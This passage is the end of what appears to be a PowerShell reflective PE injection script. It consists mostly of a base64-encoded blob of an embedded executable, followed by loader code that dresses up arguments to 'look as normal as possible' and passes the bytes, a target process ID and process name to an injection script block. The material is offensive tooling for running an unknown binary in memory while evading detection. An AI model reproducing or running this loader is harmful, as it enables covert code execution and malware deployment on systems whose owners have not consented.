ySDJMMlAyVDJYMlwyYDJkMmgybDJwMnQyeDJ8MoAyhDKIMowykDKUMpgynDKgMgAAACABAJgDAADUMNww5DDsMPQw/DAEMQwxFDEcMSQxLDE0MTwxRDFMMVQxXDFkMWwxdDF8MYQxjDGUMZwxpDGsMbQxvDHEMcwx1DHcMeQx7DH0MfwxBDIMMhQyHDIkMiwyNDI8MkQyTDJUMlwyZDJsMnQyfDKEMowylDKcMqQyrDK0MrwyxDLMMtQy3DLkMuwy9DL8MgQzDDMUMxwzJDMsMzQzPDNEM0wzVDNcM2QzbDN0M3wzhDOMM5QznDOkM6wztDO8M8QzzDPUM9wz5DPsM/Qz/DMENAw0FDQcNCQ0LDQ0NDw0RDRMNFQ0XDRkNGw0dDR8NIQ0jDSUNJw0pDSsNLQ0vDTENMw01DTcNOQ07DT0NPw0BDUMNRQ1HDUkNSw1NDU8NUQ1TDVUNVw1ZDVsNXQ1fDWENYw1lDWcNaQ1rDW0Nbw1xDXMNdQ13DXkNew19DX8NQQ2DDYUNhw2JDYsNjQ2PDZENkw2VDZcNmQ2bDZ0Nnw2hDaMNpQ2nDakNqw2tDa8NsQ2zDbUNtw25DbsNvQ2/DYENww3FDccNyQ3LDc0Nzw3RDdMN1Q3XDdkN2w3dDd8N4Q3jDeUN5w3pDesN7Q3vDfEN8w31DfcN+Q37DfwN/g3ADgIOBA4GDggOCg4MDg4OEA4SDhQOFg4YDhoOHA4eDiAOIg4kDiYOKA4qDiwOLg4wDjIONA42DjgOOg48Dj4OAA5CDkQORg5IDkoOTA5ODlAOUg5UDlYOWA5aDlwOXg5gDmIOZA5mDmgOag5sDm4OcA5yDnQOdg54DnoOfA5+DkAOgg6EDoYOiA6KDowOjg6QDpIOlA6WDpgOmg6cDp4OoA6iDqQOpg6oDqoOrA6uDrAOsg60DrYOuA66DrwOvg6ADsIOxA7GDsgOyg7MDs4O0A7SDtQO1g7YDtoO3A7eDuAO4g7kDuYO6A7qDuwO7g7wDvIO9A72DvgO+g78Dv4OwA8CDwQPBg8IDwoPDA8ODxAPEg8UDxYPGA8aDxwPHg8gDyIPJA8mDygPKg8sDy4PMA8yDzQPNg84DzoPPA8+DwAPQg9ED0YPSA9KD0wPTg9QD1IPVA9WD1gPWg9cD14PYA9iD2QPZg9oD2oPbA9uD3APcg90D3YPeA96D3wPfg9AD4IPhA+GD4gPig+MD44PkA+SD5QPlg+YD5oPnA+eD6APog+kD6YPqA+qD6wPrg+wD7IPtA+2D7gPug+8D74PgA/CD8AQAEA5AAAAOAxDDJMMlAyWDJwMoAyhDKYMpwyrDKwMrQyvDLUMuQy6DL4MvwyDDMQMxgzMDNAM0QzVDNYM1wzZDN8M7QzwDPkMwQ0DDQUNBw0JDQsNDQ0PDRANEg0XDRkNHg0mDS4NNQ02DT4NAQ1IDUsNUQ1SDVkNWg1iDWQNZQ1sDW4Nbw11DXYNfQ1+DUINiw2ODZANmw2cDZ4NoA2iDaMNpQ2qDbINug2CDcoN0g3aDd0N5A3sDfQN+w38DcQODA4UDhwOJA4sDjQOPA4EDksOTA5TDlQOVg5YDloOXA5hDkAkAEADAAAAAg4EDgAoAEAIAEAAKwxqDKsMrAytDK4MrwywDLEMsgyzDLQMtQy2DLcMuAy5DLoMuwy8DL0Mvgy/DIAMwQzCDMMMxAzFDMYMxwzIDMkMygzLDMwMzQzODM8M0AzRDNIM0wzUDNcM2AzZDNoM2wzcDN0M3gzfDOAM4QziDOMM5AzlDOYM5wzoDOkM6gzrDOwM7QzuDO8M8AzxDPIM8wz0DPUM9gz3DPgM+Qz6DPsM/Az9DP4M/wzADQENAg0DDQ0NEQ0VDRkNHQ0lDSgNKQ0qDSsNMw00DTUNNg03DTgNOQ06DTsNPA09DT4NCA1KDUsNTA1NDU4NTw1QDVENUg1TDVYNVw1YDVkNWg1bDVwNXQ1fDWANZA13DjwOAw5KDlAOWA5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    

    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
    {
        $ExeArgs = "ReflectiveExe $ExeArgs"
    }
    else
    {
        $ExeArgs = "ReflectiveExe"
    }
    
    [System.IO.Directory]::SetCurrentDirectory($pwd)
    Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, $FuncReturnType, $ProcId, $ProcName,$ForceASLR, $PoshCode)
    
}

Main
}

